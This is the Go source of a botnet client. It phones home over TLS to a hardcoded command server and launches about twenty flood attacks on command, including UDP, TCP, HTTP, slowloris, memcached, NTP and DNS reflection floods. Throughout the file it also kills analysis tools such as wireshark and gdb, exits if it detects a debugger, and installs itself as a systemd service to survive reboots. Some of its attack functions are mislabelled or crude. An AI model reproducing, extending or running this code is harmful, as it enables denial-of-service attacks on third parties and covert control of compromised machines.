package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	mrand "math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	serverAddr    = "144.172.94.160:7002"
	pingInterval  = 30 * time.Second
	statsInterval = 30 * time.Second
	challengeSalt = "anothersecretkeychangeme"
)

type BotStats struct {
	StartTime    time.Time
	AttackCount  int
	SuccessCount int
	LastCommand  time.Time
}

var (
	stats            = make(map[string]*BotStats)
	statsLock        sync.Mutex
	currentArch      = runtime.GOARCH
	activeConns      = make(map[net.Conn]bool)
	connLock         sync.Mutex
	processStartTime = time.Now()
	lastCommandTime  = time.Now()
	totalAttackCount = 0
	userAgents       = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Googlebot/2.1 (+http://www.google.com/bot.html)",
		"curl/7.68.0",
	}
)

func main() {
	logMessage("SYSTEM", "Starting bot client...")
	logMessage("SYSTEM", fmt.Sprintf("OS: %s, Arch: %s, CPUs: %d", runtime.GOOS, runtime.GOARCH, runtime.NumCPU()))

	if isDebugging() {
		logMessage("SECURITY", "Debugger detected! Exiting...")
		os.Exit(1)
	}

	logMessage("SECURITY", "Checking for analysis tools...")
	killAnalysisTools()

	logMessage("PERSISTENCE", "Setting up persistence mechanism...")
	go persistenceMechanism()

	logMessage("NETWORK", "Loading TLS certificates...")
	caCert, err := ioutil.ReadFile("certs/ca.crt")
	if err != nil {
		logMessage("ERROR", fmt.Sprintf("Failed to read CA cert: %v", err))
		return
	}

	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		logMessage("ERROR", "Failed to parse CA cert")
		return
	}

	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
	if err != nil {
		logMessage("ERROR", fmt.Sprintf("Failed to load client cert: %v", err))
		return
	}

	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		MinVersion:         tls.VersionTLS13,
		InsecureSkipVerify: true,
	}

	for {
		logMessage("NETWORK", fmt.Sprintf("Attempting to connect to C2 server at %s", serverAddr))
		conn, err := tls.Dial("tcp", serverAddr, tlsConfig)
		if err != nil {
			logMessage("ERROR", fmt.Sprintf("Connection failed: %v. Retrying in 30 seconds...", err))
			time.Sleep(30 * time.Second)
			continue
		}

		logMessage("NETWORK", "Connection established, registering bot...")
		registerBot(conn)
		handleConnection(conn)
		cleanupConnection(conn)
	}
}

func logMessage(category, message string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	var colorCode string

	switch category {
	case "SYSTEM":
		colorCode = "36" // Cyan
	case "NETWORK":
		colorCode = "33" // Yellow
	case "ATTACK":
		colorCode = "31" // Red
	case "STATS":
		colorCode = "32" // Green
	case "ERROR":
		colorCode = "35" // Magenta
	case "SECURITY":
		colorCode = "91" // Light red
	case "PERSISTENCE":
		colorCode = "34" // Blue
	default:
		colorCode = "37" // White
	}

	fmt.Printf("\033[%sm[%s] [%s] %s\033[0m\n", colorCode, timestamp, category, message)
}

func registerBot(conn net.Conn) {
	reader := bufio.NewReader(conn)
	logMessage("NETWORK", "Waiting for challenge from server...")
	challengeLine, err := reader.ReadString('\n')
	if err != nil || !strings.HasPrefix(challengeLine, "CHALLENGE:") {
		logMessage("ERROR", "Invalid challenge received from server")
		conn.Close()
		return
	}

	challenge := strings.TrimSpace(strings.TrimPrefix(challengeLine, "CHALLENGE:"))
	logMessage("AUTH", "Received challenge, generating response...")
	response := generateChallengeResponse(challenge)

	_, err = conn.Write([]byte(response + "\n"))
	if err != nil {
		logMessage("ERROR", fmt.Sprintf("Failed to send challenge response: %v", err))
		conn.Close()
		return
	}

	connLock.Lock()
	activeConns[conn] = true
	connLock.Unlock()

	stats := collectBotStats()
	logMessage("STATS", fmt.Sprintf("Sending system stats: %s", stats))
	conn.Write([]byte(fmt.Sprintf("PONG:%s:%s\n", encryptMessage(currentArch), encryptMessage(stats))))

	logMessage("NETWORK", "Bot registered successfully, starting ping handler...")
	go pingHandler(conn)
}

func generateChallengeResponse(challenge string) string {
	decoded, _ := base64.StdEncoding.DecodeString(challenge)
	h := hmac.New(sha256.New, []byte(challengeSalt))
	h.Write(decoded)
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

func pingHandler(conn net.Conn) {
	logMessage("NETWORK", "Ping handler started")
	ticker := time.NewTicker(pingInterval)
	defer ticker.Stop()

	for range ticker.C {
		connLock.Lock()
		if !activeConns[conn] {
			connLock.Unlock()
			logMessage("NETWORK", "Connection closed, stopping ping handler")
			return
		}
		connLock.Unlock()

		stats := collectBotStats()
		msg := fmt.Sprintf("PONG:%s:%s\n", encryptMessage(currentArch), encryptMessage(stats))
		logMessage("STATS", fmt.Sprintf("Sending heartbeat with stats: %s", stats))
		conn.Write([]byte(msg))
	}
}

func handleConnection(conn net.Conn) {
	logMessage("NETWORK", "Starting command handler")
	reader := bufio.NewReader(conn)
	for {
		conn.SetReadDeadline(time.Now().Add(2 * pingInterval))
		message, err := reader.ReadString('\n')
		if err != nil {
			logMessage("ERROR", fmt.Sprintf("Error reading from connection: %v", err))
			return
		}

		decrypted := strings.TrimSpace(decryptMessage(message))
		if decrypted == "" {
			continue
		}

		logMessage("COMMAND", fmt.Sprintf("Received command: %s", decrypted))

		if strings.HasPrefix(decrypted, "!") {
			handleCommand(conn, decrypted)
		}
	}
}

func handleCommand(_ net.Conn, command string) {
	parts := strings.Fields(command)
	if len(parts) < 4 {
		logMessage("ERROR", "Invalid command format received")
		return
	}

	method := parts[0]
	target := parts[1]
	port := parts[2]
	duration := parts[3]

	statsLock.Lock()
	if _, exists := stats[target]; !exists {
		stats[target] = &BotStats{StartTime: time.Now()}
	}
	stats[target].AttackCount++
	totalAttackCount++
	stats[target].LastCommand = time.Now()
	lastCommandTime = time.Now()
	statsLock.Unlock()

	dur, err := strconv.Atoi(duration)
	if err != nil || dur <= 0 {
		logMessage("ERROR", fmt.Sprintf("Invalid duration: %s", duration))
		return
	}

	logMessage("ATTACK", fmt.Sprintf("Launching %s attack on %s:%s for %d seconds", method, target, port, dur))
	go executeAttack(method, target, port, dur)

	statsLock.Lock()
	stats[target].SuccessCount++
	statsLock.Unlock()
}

func executeAttack(method, target, port string, duration int) {
	startTime := time.Now()
	logMessage("ATTACK", fmt.Sprintf("%s attack started on %s:%s", method, target, port))

	switch method {
	case "!udpflood":
		udpFlood(target, port, duration)
	case "!udpsmart":
		udpSmart(target, port, duration)
	case "!tcpflood":
		tcpFlood(target, port, duration)
	case "!synflood":
		synFlood(target, port, duration)
	case "!ackflood":
		ackFlood(target, port, duration)
	case "!greflood":
		greFlood(target, port, duration)
	case "!dns":
		dnsFlood(target, port, duration)
	case "!http":
		httpFlood(target, port, duration)
	case "!icmpflood":
		icmpFlood(target, duration)
	case "!slowloris":
		slowloris(target, port, duration)
	case "!memcached":
		memcached(target, port, duration)
	case "!ntp":
		ntpAmplification(target, port, duration)
	case "!tcpack":
		tcpAckFlood(target, port, duration)
	case "!udplag":
		udpLag(target, port, duration)
	case "!dnsreflect":
		dnsReflect(target, port, duration)
	case "!synack":
		synAckFlood(target, port, duration)
	case "!tlsflood":
		tlsFlood(target, port, duration)
	case "!httpsbypass":
		httpsBypass(target, port, duration)
	case "!highrps":
		highRps(target, port, duration)
	default:
		logMessage("ERROR", fmt.Sprintf("Unknown attack method: %s", method))
		return
	}

	logMessage("ATTACK", fmt.Sprintf("%s attack completed on %s:%s (Duration: %s)",
		method, target, port, time.Since(startTime).Round(time.Second)))
}

func udpFlood(target, port string, duration int) {
	payload := make([]byte, 1024)
	rand.Read(payload)
	conn, _ := net.Dial("udp", formatHostPort(target, port))
	defer conn.Close()

	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		conn.Write(payload)
		time.Sleep(10 * time.Millisecond)
	}
}

func udpSmart(target, port string, duration int) {
	conn, _ := net.Dial("udp", formatHostPort(target, port))
	defer conn.Close()

	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		payload := make([]byte, 500+mrand.Intn(500))
		rand.Read(payload)
		conn.Write(payload)
		time.Sleep(5 * time.Millisecond)
	}
}

func tcpFlood(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("tcp", formatHostPort(target, port))
			if conn != nil {
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func synFlood(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("tcp", formatHostPort(target, port))
			if conn != nil {
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func ackFlood(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("tcp", formatHostPort(target, port))
			if conn != nil {
				conn.Write([]byte("ACK"))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func greFlood(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("tcp", formatHostPort(target, port))
			if conn != nil {
				conn.Write([]byte("GRE"))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func dnsFlood(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("udp", formatHostPort(target, port))
			if conn != nil {
				conn.Write([]byte("DNS"))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func httpFlood(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("tcp", formatHostPort(target, port))
			if conn != nil {
				conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func icmpFlood(target string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		exec.Command("ping", "-c", "1", "-s", "65500", target).Run()
		time.Sleep(100 * time.Millisecond)
	}
}

func slowloris(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("tcp", formatHostPort(target, port))
			if conn != nil {
				conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n"))
				time.Sleep(10 * time.Second)
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func memcached(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("udp", formatHostPort(target, port))
			if conn != nil {
				conn.Write([]byte("set x 0 0 1048576\r\n" + strings.Repeat("a", 1048576) + "\r\n"))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func ntpAmplification(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("udp", formatHostPort(target, port))
			if conn != nil {
				conn.Write([]byte("\x17\x00\x03\x2a" + strings.Repeat("\x00", 468)))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func tcpAckFlood(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("tcp", formatHostPort(target, port))
			if conn != nil {
				conn.Write([]byte(fmt.Sprintf("ACK %d\r\n", mrand.Intn(1000000))))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func udpLag(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("udp", formatHostPort(target, port))
			if conn != nil {
				payload := make([]byte, 500+mrand.Intn(500))
				rand.Read(payload)
				payload[8] = 0xFF
				payload[9] = 0xFF
				conn.Write(payload)
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func dnsReflect(target, port string, duration int) {
	domains := []string{"example.com", "google.com", "cloudflare.com", "amazon.com"}
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("udp", formatHostPort(target, port))
			if conn != nil {
				query := fmt.Sprintf("%s ANY %s", randStr(10), domains[mrand.Intn(len(domains))])
				conn.Write([]byte(query))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func synAckFlood(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("tcp", formatHostPort(target, port))
			if conn != nil {
				conn.Write([]byte(fmt.Sprintf("SYN %d\r\nACK %d\r\n", mrand.Intn(1000000), mrand.Intn(1000000))))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func tlsFlood(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conf := &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				ServerName:         target,
			}
			conn, _ := tls.Dial("tcp", formatHostPort(target, port), conf)
			if conn != nil {
				conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func httpsBypass(target, port string, duration int) {
	paths := []string{"/", "/api/v1", "/wp-admin", "/admin", "/static/js/main.js"}
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("tcp", formatHostPort(target, port))
			if conn != nil {
				ua := userAgents[mrand.Intn(len(userAgents))]
				path := paths[mrand.Intn(len(paths))]
				req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n", path, target, ua)
				conn.Write([]byte(req))
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func highRps(target, port string, duration int) {
	timeout := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(timeout) {
		go func() {
			conn, _ := net.Dial("tcp", formatHostPort(target, port))
			if conn != nil {
				for i := 0; i < 100; i++ {
					conn.Write([]byte(fmt.Sprintf("GET /%d HTTP/1.1\r\nHost: %s\r\n\r\n", i, target)))
				}
				conn.Close()
			}
		}()
		time.Sleep(1 * time.Millisecond)
	}
}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[mrand.Intn(len(letters))]
	}
	return string(b)
}

func formatHostPort(host, port string) string {
	if strings.Contains(host, ":") && !strings.HasPrefix(host, "[") {
		return fmt.Sprintf("[%s]:%s", host, port)
	}
	return fmt.Sprintf("%s:%s", host, port)
}

func cleanupConnection(conn net.Conn) {
	connLock.Lock()
	delete(activeConns, conn)
	connLock.Unlock()
	conn.Close()
	logMessage("NETWORK", "Connection cleaned up and closed")
}

func collectBotStats() string {
	ram := getSystemRAM()
	cores := getCPUCount()
	uptime := time.Since(processStartTime).Seconds()

	statsLock.Lock()
	attackCount := totalAttackCount
	statsLock.Unlock()

	statsStr := fmt.Sprintf("Latency: %.2fs | Throughput: %.2f attacks/s | RAM: %.1fGB | Cores: %d",
		time.Since(lastCommandTime).Seconds(),
		float64(attackCount)/uptime,
		ram,
		cores)

	logMessage("STATS", "Collected bot stats: "+statsStr)
	return fmt.Sprintf("%.2f|%.2f|%.1f|%d",
		time.Since(lastCommandTime).Seconds(),
		float64(attackCount)/uptime,
		ram,
		cores)
}

func getSystemRAM() float64 {
	data, err := ioutil.ReadFile("/proc/meminfo")
	if err != nil {
		logMessage("ERROR", fmt.Sprintf("Failed to read memory info: %v", err))
		return 0
	}

	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				kb, _ := strconv.ParseFloat(fields[1], 64)
				return kb / 1024 / 1024
			}
		}
	}
	return 0
}

func isDebugging() bool {
	_, err := os.Stat("/proc/self/status")
	if err != nil {
		return false
	}

	data, err := ioutil.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}

	if !strings.Contains(string(data), "TracerPid:\t0") {
		logMessage("SECURITY", "Debugger detected in process status!")
		return true
	}
	return false
}

func getCPUCount() int {
	return runtime.NumCPU()
}

func killAnalysisTools() {
	tools := []string{"wireshark", "tcpdump", "strace", "ltrace", "gdb"}
	for _, tool := range tools {
		err := exec.Command("pkill", "-9", tool).Run()
		if err == nil {
			logMessage("SECURITY", fmt.Sprintf("Terminated analysis tool: %s", tool))
		}
	}
}

func persistenceMechanism() {
	service := `[Unit]
Description=Bot Service
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=` + os.Args[0] + `

[Install]
WantedBy=multi-user.target`

	err := ioutil.WriteFile("/etc/systemd/system/bot.service", []byte(service), 0644)
	if err != nil {
		logMessage("ERROR", fmt.Sprintf("Failed to create service file: %v", err))
		return
	}

	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "bot.service").Run()
	err = exec.Command("systemctl", "start", "bot.service").Run()
	if err != nil {
		logMessage("ERROR", fmt.Sprintf("Failed to start service: %v", err))
	} else {
		logMessage("PERSISTENCE", "Persistence mechanism installed successfully")
	}
}

func encryptMessage(msg string) string {
	return fmt.Sprintf("%x", msg)
}

func decryptMessage(msg string) string {
	decoded, _ := hex.DecodeString(msg)
	return string(decoded)
}
